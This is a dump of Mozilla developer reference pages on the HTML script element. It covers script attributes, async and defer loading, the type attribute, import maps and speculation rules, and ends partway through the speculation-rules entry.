default value, and a fallback value if `referrerpolicy` is not supported. If `referrerpolicy` is not explicitly specified on the `<script>` element, it will adopt a higher-level referrer policy, i.e. one set on the whole document or domain. If a higher-level policy is not available, the empty string is treated as being equivalent to `strict-origin-when-cross-origin`.\n\n[`src`](#src)  \nThis attribute specifies the URI of an external script; this can be used as an alternative to embedding a script directly within a document.\n\n[`type`](script/type)  \nThis attribute indicates the type of script represented. The value of this attribute will be one of the following:\n\n[**Attribute is not set (default), an empty string, or a JavaScript MIME type**](#attribute_is_not_set_default_an_empty_string_or_a_javascript_mime_type)  \nIndicates that the script is a \"classic script\", containing JavaScript code. Authors are encouraged to omit the attribute if the script refers to JavaScript code rather than specify a MIME type. JavaScript MIME types are [listed in the IANA media types specification](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#textjavascript).\n\n[`importmap`](script/type/importmap)  \nThis value indicates that the body of the element contains an import map. The import map is a JSON object that developers can use to control how the browser resolves module specifiers when importing [JavaScript modules](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules#importing_modules_using_import_maps).\n\n[`module`](#module)  \nThis value causes the code to be treated as a JavaScript module. The processing of the script contents is deferred. The `charset` and `defer` attributes have no effect. For information on using `module`, see our [JavaScript modules](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules) guide. Unlike classic scripts, module scripts require the use of the CORS protocol for cross-origin fetching.\n\n[`speculationrules`](script/type/speculationrules) Experimental  \nThis value indicates that the body of the element contains speculation rules. Speculation rules take the form of a JSON object that determine what resources should be prefetched or prerendered by the browser. This is part of the [Speculation Rules API](https://developer.mozilla.org/en-US/docs/Web/API/Speculation_Rules_API).\n\n[**Any other value**](#any_other_value)  \nThe embedded content is treated as a data block, and won't be processed by the browser. Developers must use a valid MIME type that is not a JavaScript MIME type to denote data blocks. All of the other attributes will be ignored, including the `src` attribute.\n\n### Deprecated attributes\n\n[`charset`](#charset) Deprecated  \nIf present, its value must be an [ASCII](https://developer.mozilla.org/en-US/docs/Glossary/ASCII) case-insensitive match for \"`utf-8`\". It's unnecessary to specify the `charset` attribute, because documents must use UTF-8, and the `script` element inherits its character encoding from the document.\n\n[`language`](#language) Deprecated Non-standard  \nLike the `type` attribute, this attribute identifies the scripting language in use. Unlike the `type` attribute, however, this attribute's possible values were never standardized. The `type` attribute should be used instead.\n\n## Notes\n\nScripts without [`async`](#async), [`defer`](#defer) or `type=\"module\"` attributes, as well as inline scripts without the `type=\"module\"` attribute, are fetched and executed immediately before the browser continues to parse the page.\n\nThe script should be served with the `text/javascript` MIME type, but browsers are lenient and only block them if the script is served with an image type (`image/*`), a video type (`video/*`), an audio type (`audio/*`), or `text/csv`. If the script is blocked, an [`error`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/error_event) event is sent to the element; otherwise, a [`load`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/load_event) event is sent.\n\n## Examples\n\n### Basic usage\n\nThese examples show how to import (an external) script using the `<script>` element.\n\nhtml\n\n```\n<script src=\"javascript.js\"></script>\n```\n\nAnd the following examples show how to put (an inline) script inside the `<script>` element.\n\nhtml\n\n```\n<script>\n  alert(\"Hello World!\");\n</script>\n```\n\n### async and defer\n\nScripts loaded using the `async` attribute will download the script without blocking the page while the script is being fetched. However, once the download is complete, the script will execute, which blocks the page from rendering. This means that the rest of the content on the web page is prevented from being processed and displayed to the user until the script finishes executing. You get no guarantee that scripts will run in any specific order. It is best to use `async` when the scripts in the page run independently from each other and depend on no other script on the page.\n\nScripts loaded with the `defer` attribute will load in the order they appear on the page. They won't run until the page content has all loaded, which is useful if your scripts depend on the DOM being in place (e.g. they modify one or more elements on the page).\n\nHere is a visual representation of the different script loading methods and what that means for your page:\n\n*This image is from the [HTML spec](https://html.spec.whatwg.org/images/asyncdefer.svg), copied and cropped to a reduced version, under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license terms.*\n\nFor example, if you have the following script elements:\n\nhtml\n\n```\n<script async src=\"js/vendor/jquery.js\"></script>\n<script async src=\"js/script2.js\"></script>\n<script async src=\"js/script3.js\"></script>\n```\n\nYou can't rely on the order the scripts will load in. `jquery.js` may load before or after `script2.js` and `script3.js` and if this is the case, any functions in those scripts depending on `jquery` will produce an error because `jquery` will not be defined at the time the script runs.\n\n`async` should be used when you have a bunch of background scripts to load in, and you just want to get them in place as soon as possible. For example, maybe you have some game data files to load, which will be needed when the game actually begins, but for now you just want to get on with showing the game intro, titles, and lobby, without them being blocked by script loading.\n\nScripts loaded using the `defer` attribute (see below) will run in the order they appear in the page and execute them as soon as the script and content are downloaded:\n\nhtml\n\n```\n<script defer src=\"js/vendor/jquery.js\"></script>\n<script defer src=\"js/script2.js\"></script>\n<script defer src=\"js/script3.js\"></script>\n```\n\nIn the second example, we can be sure that `jquery.js` will load before `script2.js` and `script3.js` and that `script2.js` will load before `script3.js`. They won't run until the page content has all loaded, which is useful if your scripts depend on the DOM being in place (e.g. they modify one or more elements on the page).\n\nTo summarize:\n\n- `async` and `defer` both instruct the browser to download the script(s) in a separate thread, while the rest of the page (the DOM, etc.) is downloading, so the page loading is not blocked during the fetch process.\n- scripts with an `async` attribute will execute as soon as the download is complete. This blocks the page and does not guarantee any specific execution order.\n- scripts with a `defer` attribute will load in the order they are in and will only execute once everything has finished loading.\n- If your scripts should be run immediately and they don't have any dependencies, then use `async`.\n- If your scripts need to wait for parsing and depend on other scripts and/or the DOM being in place, load them using `defer` and put their corresponding `<script>` elements in the order you want the browser to execute them.\n\n### Module fallback\n\nBrowsers that support the `module` value for the [`type`](#type) attribute ignore any script with a `nomodule` attribute. That enables you to use module scripts while providing `nomodule`-marked fallback scripts for non-supporting browsers.\n\nhtml\n\n```\n<script type=\"module\" src=\"main.js\"></script>\n<script nomodule src=\"fallback.js\"></script>\n```\n\n### Importing modules with importmap\n\nWhen importing modules in scripts, if you don't use the [`type=importmap`](#importmap) feature, then each module must be imported using a module specifier that is either an absolute or relative URL. In the example below, the first module specifier (\"./shapes/square.js\") resolves relative to the base URL of the document, while the second is an absolute URL.\n\njs\n\n```\nimport { name as squareName, draw } from \"./shapes/square.js\";\nimport { name as circleName } from \"https://example.com/shapes/circle.js\";\n```\n\nAn import map allows you to provide a mapping that, if matched, can replace the text in the module specifier. The import map below defines keys `square` and `circle` that can be used as aliases for the module specifiers shown above.\n\nhtml\n\n```\n<script type=\"importmap\">\n  {\n    \"imports\": {\n      \"square\": \"./shapes/square.js\",\n      \"circle\": \"https://example.com/shapes/circle.js\"\n    }\n  }\n</script>\n```\n\nThis allows us to import modules using names in the module specifier (rather than absolute or relative URLs).\n\njs\n\n```\nimport { name as squareName, draw } from \"square\";\nimport { name as circleName } from \"circle\";\n```\n\nFor more examples of what you can do with import maps, see the [Importing modules using import maps](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules#importing_modules_using_import_maps) section in the JavaScript modules guide.\n\n### Embedding data in HTML\n\nYou can also use the `<script>` element to embed data in HTML with server-side rendering by specifying a valid non-JavaScript MIME type in the `type` attribute.\n\nhtml\n\n```\n<!-- Generated by the server -->\n<script id=\"data\" type=\"application/json\">\n  {\n    \"userId\": 1234,\n    \"userName\": \"Maria Cruz\",\n    \"memberSince\": \"2000-01-01T00:00:00.000Z\"\n  }\n</script>\n\n<!-- Static -->\n<script>\n  const userInfo = JSON.parse(document.getElementById(\"data\").text);\n  console.log(\"User information: %o\", userInfo);\n</script>\n```\n\n### Blocking rendering till a script is fetched and executed\n\nYou can include `render` token inside a `blocking` attribute; the rendering of the page will be blocked till the script is fetched and executed. In the example below, we block rendering on an async script, so that the script doesn't block parsing but is guaranteed to be evaluated before rendering starts.\n\nhtml\n\n```\n<script blocking=\"render\" async src=\"async-script.js\"></script>\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                                                              |\n|---------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Metadata content](../content_categories#metadata_content), [Flow content](../content_categories#flow_content), [Phrasing content](../content_categories#phrasing_content).  |\n| Permitted content                           | Dynamic script such as `text/javascript`.                                                                                                                                    |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                        |\n| Permitted parents                           | Any element that accepts [metadata content](../content_categories#metadata_content), or any element that accepts [phrasing content](../content_categories#phrasing_content). |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                          |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                                          |\n| DOM interface                               | [`HTMLScriptElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLScriptElement)                                                                                    |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`document.currentScript`](https://developer.mozilla.org/en-US/docs/Web/API/Document/currentScript)\n- [Flavio Copes' article on loading JavaScript efficiently and explaining the differences between `async` and `defer`](https://flaviocopes.com/javascript-async-defer/)\n- [JavaScript modules](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules) guide\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script)"
- name: script.type
  summary: 'The type attribute of the <script> element indicates the type of script represented by the element: a classic script, an import map, a JavaScript module, speculation rules, or a data block'
  description: "# \\<script\\>: type attribute\n\nThe `type` attribute of the [`<script>`](../script) element indicates the *type* of script represented by the element: a classic script, an import map, a JavaScript module, speculation rules, or a data block.\n\n## Value\n\nThe value of this attribute indicates the type of data represented by the script, and will be one of the following:\n\n[**Attribute is not set (default), an empty string, or a JavaScript MIME type**](#attribute_is_not_set_default_an_empty_string_or_a_javascript_mime_type)  \nIndicates that the script is a \"classic script\", containing JavaScript code. Authors are encouraged to omit the attribute if the script refers to JavaScript code rather than specify a MIME type. JavaScript MIME types are [listed in the IANA media types specification](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#textjavascript).\n\n[`importmap`](type/importmap)  \nThis value indicates that the body of the element contains an import map. The import map is a JSON object that developers can use to control how the browser resolves module specifiers when importing [JavaScript modules](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules#importing_modules_using_import_maps).\n\n[`module`](#module)  \nThis value causes the code to be treated as a JavaScript module. The processing of the script contents is deferred. The `charset` and `defer` attributes have no effect. For information on using `module`, see our [JavaScript modules](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules) guide. Unlike classic scripts, module scripts require the use of the CORS protocol for cross-origin fetching.\n\n[`speculationrules`](type/speculationrules) Experimental  \nThis value indicates that the body of the element contains speculation rules. Speculation rules take the form of a JSON object that determine what resources should be prefetched or prerendered by the browser. This is part of the [Speculation Rules API](https://developer.mozilla.org/en-US/docs/Web/API/Speculation_Rules_API).\n\n[**Any other value**](#any_other_value)  \nThe embedded content is treated as a data block, and won't be processed by the browser. Developers must use a valid MIME type that is not a JavaScript MIME type to denote data blocks. All of the other attributes will be ignored, including the `src` attribute.\n\n**Note:** In earlier browsers, the type identified the scripting language of the embedded or imported (via the `src` attribute) code.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type)"
- name: script.type.importmap
  summary: Since March 2023, this feature works across the latest devices and browser versions
  description: "# \\<script type=\"importmap\"\\>\n\n## Baseline 2023\n\nNewly available\n\nSince March 2023, this feature works across the latest devices and browser versions. This feature might not work in older devices or browsers.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fscript%2Ftype%2Fimportmap&level=low)\n\nThe `importmap` value of the [`type`](../type) attribute of the [`<script>` element](../../script) indicates that the body of the element contains an import map.\n\nAn import map is a JSON object that allows developers to control how the browser resolves module specifiers when importing [JavaScript modules](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules). It provides a mapping between the text used as the module specifier in an [`import` statement](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import) or [`import()` operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/import), and the corresponding value that will replace the text when resolving the specifier. The JSON object must conform to the [Import map JSON representation format](#import_map_json_representation).\n\nAn import map is used to resolve module specifiers in static and dynamic imports, and therefore must be declared and processed before any `<script>` elements that import modules using specifiers declared in the map. Note that the import map applies only to module specifiers in the [`import` statement](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import) or [`import()` operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/import) for modules loaded into documents; it does not apply to the path specified in the `src` attribute of a `<script>` element or to modules loaded into workers or worklets.\n\nFor more information, see the [Importing modules using import maps](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules#importing_modules_using_import_maps) section in the JavaScript modules guide.\n\n## Syntax\n\nhtml\n\n```\n<script type=\"importmap\">\n  // JSON object defining import\n</script>\n```\n\nThe `src`, `async`, `nomodule`, `defer`, `crossorigin`, `integrity`, and `referrerpolicy` attributes must not be specified.\n\nOnly the first import map in the document with an inline definition is processed; any additional import maps and external import maps are ignored.\n\n### Exceptions\n\n[`TypeError`](#typeerror)  \nThe import map definition is not a JSON object, the `importmap` key is defined but its value is not a JSON object, or the `scopes` key is defined but its value is not a JSON object.\n\nBrowsers generate console warnings for other cases where the import map JSON does not conform to the [import map](#import_map_json_representation) schema.\n\nAn [`error` event](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/error_event) is fired at script elements with `type=\"importmap\"` that are not processed. This might occur, for example, if module loading has already started when an import map is processed, or if multiple import maps are defined in the page.\n\n## Description\n\nWhen importing a [JavaScript module](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules), both the [`import` statement](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import) and [`import()` operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/import) have a \"module specifier\" that indicates the module to be imported. A browser must be able to resolve this specifier to an absolute URL in order to import the module.\n\nFor example, the following statements import elements from the module specifier `\"./modules/shapes/square.js\"`, which is a path relative to the base URL of the document, and the module specifier `\"https://example.com/shapes/circle.js\"`, which is an absolute URL.\n\njs\n\n```\nimport { name as squareName, draw } from \"./modules/shapes/square.js\";\nimport { name as circleName } from \"https://example.com/shapes/circle.js\";\n```\n\nImport maps allow developers to specify (almost) any text they want in the module specifier; the map provides a corresponding value that will replace the text when the module specifier is resolved.\n\n### Bare modules\n\nThe import map below defines an `imports` key that has a \"module specifier map\" with properties `square` and `circle`.\n\nhtml\n\n```\n<script type=\"importmap\">\n  {\n    \"imports\": {\n      \"square\": \"./module/shapes/square.js\",\n      \"circle\": \"https://example.com/shapes/circle.js\"\n    }\n  }\n</script>\n```\n\nWith this import map we can import the same modules as above, but using \"bare modules\" in our module specifiers:\n\njs\n\n```\nimport { name as squareName, draw } from \"square\";\nimport { name as circleName } from \"circle\";\n```\n\n### Mapping path prefixes\n\nA module specifier map key can also be used to remap a path prefix in a module specifier. Note that in this case the property and mapped path must both have a trailing forward slash (`/`).\n\nhtml\n\n```\n<script type=\"importmap\">\n  {\n    \"imports\": {\n      \"shapes/\": \"./module/shapes/\",\n      \"othershapes/\": \"https://example.com/modules/shapes/\"\n    }\n  }\n</script>\n```\n\nWe could then import a circle module as shown.\n\njs\n\n```\nimport { name as circleName } from \"shapes/circle.js\";\n```\n\n### Paths in the module specifier map key\n\nModule specifier keys do not have to be single word names (\"bare names\"). They can also contain or end with path separators, or be absolute URLs, or be relative URL paths that start with `/`, `./`, or `../`.\n\njson\n\n```\n{\n  \"imports\": {\n    \"modules/shapes/\": \"./module/src/shapes/\",\n    \"modules/square\": \"./module/src/other/shapes/square.js\",\n    \"https://example.com/modules/square.js\": \"./module/src/other/shapes/square.js\",\n    \"../modules/shapes/\": \"/modules/shapes/\"\n  }\n}\n```\n\nIf there are several module specifier keys in a module specifier map that might match, then the most specific key will be selected (i.e. the one with the longer path/value).\n\nA module specifier of `./foo/../js/app.js` would be resolved to `./js/app.js` before matching. This means that a module specifier key of `./js/app.js` would match the module specifier even though they are not exactly the same.\n\n### Scoped module specifier maps\n\nYou can use the `scopes` key to provide mappings that are only used if the script importing the module contains a particular URL path. If the URL of the loading script matches the supplied path, the mapping associated with the scope will be used. This allows different versions of the module to be used depending on what code is doing the importing.\n\nFor example, the map below will only use the scoped map if the loading module has a URL that includes the path: \"/modules/customshapes/\".\n\nhtml\n\n```\n<script type=\"importmap\">\n  {\n    \"imports\": {\n      \"square\": \"./module/shapes/square.js\"\n    },\n    \"scopes\": {\n      \"/modules/customshapes/\": {\n        \"square\": \"https://example.com/modules/shapes/square.js\"\n      }\n    }\n  }\n</script>\n```\n\nIf multiple scopes match the referrer URL, then the most specific scope path is used (the scope key name with the longest name). The browser falls back to the next most specific scoped path if there is no matching specifier, and so on, eventually falling back to the module specifier map in the `imports` key.\n\n### Integrity metadata map\n\nYou can use the `integrity` key to provide mapping for module [integrity metadata](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#using_subresource_integrity). This enables you to ensure the integrity of dynamically or statically imported modules. `integrity` also enables you to provide a fallback for top-level or preloaded modules, in case they don't already include an `integrity` attribute.\n\nThe map keys represent module URLs, which can be absolute or relative (starting with `/`, `./`, or `../`). The map values represent integrity metadata, identical to that used in [`integrity`](../../script#integrity) attribute values.\n\nFor example, the map below defines integrity metadata for the `square.js` module (directly) and its bare specifier (transitively, via the `imports` key).\n\nhtml\n\n```\n<script type=\"importmap\">\n  {\n    \"imports\": {\n      \"square\": \"./module/shapes/square.js\"\n    },\n    \"integrity\": {\n      \"./module/shapes/square.js\": \"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\"\n    }\n  }\n</script>\n```\n\n## Import map JSON representation\n\nThe following is a \"formal\" definition of the import map JSON representation.\n\nThe import map must be a valid JSON object that can define at most two optional keys: `imports` and `scopes`. Each key's value must be an object, which may be empty.\n\n[`imports`](#imports) Optional  \nThe value is a [module specifier map](#module_specifier_map), which provides the mappings between module specifier text that might appear in an `import` statement or `import()` operator, and the text that will replace it when the specifier is resolved.\n\nThis is the fallback map that is searched for matching module specifiers if no `scopes` path URLs match, or if module specifier maps in matching `scopes` paths do not contain a key that matches the module specifier.\n\n[`<module specifier map>`](#module_specifier_map)  \nA \"module specifier map\" is a valid JSON object where the *keys* are text that may be present in the module specifier when importing a module, and the corresponding *values* are the URLs or paths that will replace this text when the module specifier is resolved to an address.\n\nThe module specifier map JSON object has the following requirements:\n\n- None of the keys may be empty.\n- All of the values must be strings, defining either a valid absolute URL or a valid URL string that starts with `/`, `./`, or `../`.\n- If a key ends with `/`, then the corresponding value must also end with `/`. A key with a trailing `/` can be used as a prefix for when mapping (or remapping) modules addresses.\n- The object properties' ordering is irrelevant: if multiple keys can match the module specifier, the most specific key is used (in other words, a specifier \"olive/branch/\" would match before \"olive/\").\n\n[`integrity`](#integrity) Optional  \nDefines a valid JSON object where the *keys* are strings containing valid absolute or relative URLs (starting with `/`, `./`, or `../`), and the corresponding *values* are valid [integrity metadata](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#using_subresource_integrity).\n\nIf the URL of a script importing or preloading a module matches a key in the `integrity` object, the corresponding integrity metadata is applied to the script's fetch options, unless they already have integrity metadata attached to them.\n\n[`scopes`](#scopes) Optional  \nScopes define path-specific [module specifier maps](#module_specifier_map), allowing the choice of map to depend on the path of the code importing the module.\n\nThe scopes object is a valid JSON object where each property is a `<scope key>`, which is an URL path, with a corresponding value that is a `<module specifier map>`.\n\nIf the URL of a script importing a module matches a `<scope key>` path, then the `<module specifier map>` value associated with the key is checked for matching specifiers first. If there are multiple matching scope keys, then the value associated with the most specific/nested scope paths are checked for matching module specifiers first. The fallback module specifier map in `imports` is used if there are no matching module specifier keys in any of the matching scoped module specifier maps.\n\nNote that the scope does not change how an address is resolved; relative addresses are always resolved to the import map base URL.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|             | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|             | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `importmap` | 89      | 89   | 108     | 75    | 16.4   | 89             | 108                 | 63            | 16.4          | 15.0             | 89              |     |\n| `integrity` | 127     | 127  | No      | 113   | 18     | 127            | No                  | No            | 18            | No               | 127             |     |\n\n## See also\n\n- [JavaScript modules \\> Importing modules using import maps](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules#importing_modules_using_import_maps)\n- [The `type` attribute of HTML `<script>` elements](../../script#type)\n- [`import` statement](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import)\n- [`import()` operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/import)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap)"
- name: script.type.speculationrules
  summary: 'Experimental: This is an experimental technologyCheck the Browser compatibility table carefully before using this in production'
  description: "# \\<script type=\"speculationrules\"\\>\n\n**Experimental:** **This is an [experimental technology](https://developer.mozilla.org/en-US/docs/MDN/Writing_guidelines/Experimental_deprecated_obsolete#experimental)**  \nCheck the [Browser compatibility table](#browser_compatibility) carefully before using this in production.\n\nThe `speculationrules` value of the [`type`](../type) attribute of the [`<script>` element](../../script) indicates that the body of the element contains speculation rules.\n\nSpeculation rules take the form of a JSON structure that determine what resources should be prefetched or prerendered by the browser. This is part of the [Speculation Rules API](https://developer.mozilla.org/en-US/docs/Web/API/Speculation_Rules_API).\n\n**Note:** Speculation rules can be defined inside external text files referenced by the [`Speculation-Rules`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Speculation-Rules) HTTP header, using the same [JSON representation provided below](#speculation_rules_json_representation). Specifying an HTTP header is useful in cases where developers are not able to directly modify the document itself.\n\n## Syntax\n\nhtml\n\n```\n<script type=\"speculationrules\">\n  // JSON object defining rules\n</script>\n```\n\n**Note:** The `src`, `async`, `nomodule`, `defer`, `crossorigin`, `integrity`, and `referrerpolicy` attributes must not be specified.\n\n### Exceptions\n\n[`TypeError`](#typeerror)  \nThe speculation rules definition is not a valid JSON object.\n\n## Description\n\nA `<script type=\"speculationrules\">` element must contain a valid JSON structure that defines speculation rules. The following examples show separate prefetch and prerender rules:\n\nhtml\n\n```\n<script type=\"speculationrules\">\n  {\n    \"prefetch\": [\n      {\n        \"urls\": [\"next.html\", \"next2.html\"],\n        \"requires\": [\"anonymous-client-ip-when-cross-origin\"],\n        \"referrer_policy\": \"no-referrer\"\n      }\n    ]\n  }\n</script>\n```\n\nhtml\n\n```\n<script type=\"speculationrules\">\n  {\n    \"prerender\": [\n      {\n        \"where\": { \"href_matches\": \"/next\" },\n        \"eagerness\": \"eager\"\n      }\n    ]\n  }\n</script>\n```\n\n### Speculation rules JSON representation\n\nThe JSON structure contains one or more fields at the top level, each one representing an action to define speculation rules for. At present the supported actions are:\n\n[`\"prefetch\"`](#prefetch) Optional Experimental  \nRules for potential future navigations that should have their associated document response body downloaded, leading to significant performance improvements when those documents are navigated to. Note that none of the subresources referenced by the page are downloaded.\n\n[`\"prerender\"`](#prerender) Optional Experimental  \nRules for potential future navigations that should have their associated documents fully downloaded, rendered, and loaded into an invisible tab. This includes loading all subresources, running all JavaScript, and even loading subresources and performing data fetches started by JavaScript. When those documents are navigated to, navigations will be instant, leading to major performance improvements.\n\n**Note:** Consult the [Speculation Rules API](https://developer.mozilla.org/en-US/docs/Web/API/Speculation_Rules_API) main page for full details on how to use prefetch and prerender effectively.\n\nEach action field contains an array, which in turn contains one or more objects. Each object contains a single rule defining a set of URLs and related parameters.\n\nEach object can contain the following properties:\n\n[`\"source\"`](#source)  \nA string indicating the source of the URLs to which the rule applies. This is optional because the value can always be inferred from other properties.\n\nThis can be one of:\n\n[`\"document\"`](#document)  \nSpecifies that the URLs will be matched from navigation links in the associated document (as defined in [`<a>`](../../a) and [`<area>`](../../area) elements), based on the conditions described by a `\"where\"` key. Note that the presence of a `\"where\"` key implies `\"source\": \"document\"`, so it is optional.\n\n[`\"list\"`](#list)  \nSpecifies that the URLs will come from a list, specified in the `\"urls\"` key. Note that the presence of a `\"urls\"` key implies `\"source\": \"list\"`, so it is optional.\n\n[`\"urls\"`](#urls) Experimental  \nAn array of strings representing a list of URLs to apply the rule to. These can be absolute or relative URLs. Relative URLs will be parsed relative to the document base URL (if inline in a document) or relative to the external resource URL (if externally fetched). `\"urls\"` and `\"where\"` cannot both be set in the same rule.\n\n[`\"where\"`](#where) Experimental  \nAn object representing the conditions by which the rule matches URLs contained in the associated document. Effectively, the `\"where\"` object represents a test that is performed on every link on the page to see whether the speculation rule is applied to it. `\"where\"` and `\"urls\"` cannot both be set in the same rule.\n\nThis object can contain exactly one of the following properties:\n\n[`\"href_matches\"`](#href_matches)  \nA string containing a URL pattern, or an array containing multiple URL pattern strings, which follow the standard [URL Pattern API syntax](https://developer.mozilla.org/en-US/docs/Web/API/URL_Pattern_API). Links in the document whose URLs match the pattern(s) will have the rule applied.\n\n[`\"relative_to\"`](#relative_to)  \nIn the case of an `\"href_matches\"` condition, this can specify where you want that condition to be matched relative to. This works in exactly the same way as the [rule-level `\"relative_to\"` key](#relative_to_2), except that it only affects a single `\"href_matches\"` condition inside a `\"where\"` key.\n\n[`\"selector_matches\"`](#selector_matches)  \nA string containing a [CSS selector](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_selectors), or an array containing multiple CSS selectors. Links in the document matched by those selectors will have the rule applied.\n\n[`\"and\"`](#and)  \nAn array containing one or more objects containing conditions (`\"href_matches\"`, `\"selector_matches\"`, `\"and\"`, `\"not\"`, or `\"or\"`), all of which must match for the rule to be applied to them.\n\n[`\"not\"`](#not)  \nAn object containing one condition (`\"href_matches\"`, `\"selector_matches\"`, `\"and\"`, `\"not\"`, or `\"or\"`) which, if it matches, will *not* have the rule applied to it. All links that *do not* match the condition *will* have the rule applied.\n\n[`\"or\"`](#or)  \nAn array containing one or more objects containing conditions (`\"href_matches\"`, `\"selector_matches\"`, `\"and\"`, `\"not\"`, or `\"or\"`), any of which can match for the rule to be applied to them.\n\n`\"where\"` conditions can be nested multiple levels deep to create complex conditions, or you can choose to split them into separate rules to keep them simple. See [where examples](#where_syntax_examples) for more explanation, and multiple examples of use.\n\n[`\"eagerness\"`](#eagerness) Experimental  \nA string providing a hint to the browser as to how eagerly it should prefetch/prerender link targets in order to balance performance advantages against resource overheads. Possible values are:\n\n[`\"immediate\"`](#immediate)  \nThe author thinks the link is very likely to be followed, and/or the document may take significant time to fetch. Prefetch/prerender should start as soon as possible, subject only to considerations such as user preferences and resource limits.\n\n[`\"eager\"`](#eager)  \nThe author wants to prefetch/prerender a large number of navigations, as early as possible. Prefetch/prerender should start on any slight suggestion that a link may be followed. For example, the user could move their mouse cursor towards the link, hover/focus it for a moment, or pause scrolling with the link in a prominent place.\n\n[`\"moderate\"`](#moderate)  \nThe author is looking for a balance between `eager` and `conservative`. Prefetch/prerender should start when there is a reasonable suggestion that the user will follow a link in the near future. For example, the user could scroll a link into the viewport and hover/focus it for some time.\n\n[`\"conservative\"`](#conservative)  \nThe author wishes to get some benefit from speculative loading with a fairly small tradeoff of resources. Prefetch/prerender should start only when the user is starting to click on the link, for example on [`mousedown`](https://developer.mozilla.org/en-US/docs/Web/API/Element/mousedown_event) or [`pointerdown`](https://developer.mozilla.org/en-US/docs/Web/API/Element/pointerdown_event).\n\nIf `\"eagerness\"` is not explicitly specified, list (`\"urls\"`) rules default to `immediate` and document (`\"where\"`) rules default to `conservative`. The browser takes this hint into consideration along with its own heuristics, so it may select a link that the author has hinted as less eager than another, if the less eager candidate is considered a better choice.\n\n[`\"expects_no_vary_search\"`](#expects_no_vary_search) Experimental  \nA string providing a hint to the browser as to what [`No-Vary-Search`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/No-Vary-Search) header value will be set on responses for documents that it is receiving prefetch/prerender requests for. The browser can use this to determine ahead of time whether it is more useful to wait for an existing prefetch/prerender to finish, or start a new fetch request when the speculation rule is matched. See the [`\"expects_no_vary_search\"` example](#expects_no_vary_search_example) for more explanation of how this can be used.\n\n[`\"referrer_policy\"`](#referrer_policy) Experimental  \nA string representing a specific referrer policy string to use when requesting the URLs specified in the rule — see [`Referrer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) for possible values. The purpose of this is to allow the referring page to set a stricter policy specifically for the speculative request than the policy the page already has set (either by default, or by using `Referrer-Policy`).\n\n**Note:** A cross-site prefetch requires a referrer policy that is at least as strict as the default `\"strict-origin-when-cross-origin\"` value — so `\"strict-origin-when-cross-origin\"`, `\"same-origin\"`, `\"strict-origin\"`, or `\"no-referrer\"`. A laxer policy set in the speculation rules will override a stricter policy set on the referring page 